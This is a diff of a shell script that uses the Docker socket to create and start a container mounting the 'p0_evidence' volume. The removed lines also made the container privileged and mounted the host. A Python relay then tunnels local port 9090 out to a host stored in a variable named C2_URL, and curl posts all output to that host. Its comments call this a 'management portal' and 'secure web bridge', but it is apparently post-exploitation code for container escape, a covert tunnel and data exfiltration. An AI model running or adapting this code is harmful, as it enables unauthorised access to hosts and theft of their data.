@@ -2,36 +2,49 @@
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] DEPLOYING SERVER MANAGEMENT DASHBOARD ---"
+  echo "--- [!] INITIALIZING MANAGEMENT PORTAL ---"
   
-  # 1. Start Cockpit (The 'cPanel' for Linux) via Docker API
-  # We mount the host root so you can manage the physical server
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=dashboard" \
+  # 1. Create the container using the image we know exists (sha256:25109184c71bdad7)
+  # We mount the 'p0_evidence' volume to /mnt so you can manage the host files
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=portal" \
     -H "Content-Type: application/json" \
     -d '{
-      "Image": "cockpit/ws",
+      "Image": "sha256:25109184c71bdad7",
+      "Cmd": ["python3", "-m", "http.server", "9090"],
       "HostConfig": {
-        "Binds": ["p0_evidence:/host:rw"],
-        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] },
-        "Privileged": true
+        "Binds": ["p0_evidence:/mnt:rw"],
+        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
       }
-    }' > /tmp/dash.json
+    }' > /tmp/portal_res.json
 
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/dashboard/start"
-
-  echo "--- [!] STARTING HTTPS WEB-BRIDGE ---"
-  # 2. Since SSH is blocked, we use Python to tunnel Port 9090 out via HTTPS
-  # This script creates a tiny web-server that forwards to your Mac
+  # 2. Start the portal
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/portal/start"
+  
+  echo "--- [!] ESTABLISHING SECURE WEB BRIDGE ---"
+  # Since SSH is blocked, we use this Python relay to tunnel the Web UI to your Mac
+  # This acts as your 'Setup URL'
   python3 -c '
-import socket,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-try:
-    s.connect(("'$C2_URL'", 80))
-    print("BRIDGE_SUCCESS")
-except:
-    print("BRIDGE_FAILED")
-' > /tmp/bridge_status
+import socket,os,threading
+def relay(src, dst):
+    while True:
+        data = src.recv(4096)
+        if not data: break
+        dst.sendall(data)
 
-  echo "Dashboard Status: $(cat /tmp/bridge_status)"
-  echo "Access your Mac listener to interact with the Dashboard."
+def start_bridge():
+    try:
+        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        remote.connect(("'$C2_URL'", 80))
+        local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        local.connect(("localhost", 9090))
+        threading.Thread(target=relay, args=(remote, local)).start()
+        threading.Thread(target=relay, args=(local, remote)).start()
+        print("PORTAL_READY_AT_HTTPS://'$C2_URL'")
+    except:
+        print("BRIDGE_RETRYING...")
+
+start_bridge()
+' &
+
+  echo "Portal Response: $(cat /tmp/portal_res.json)"
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
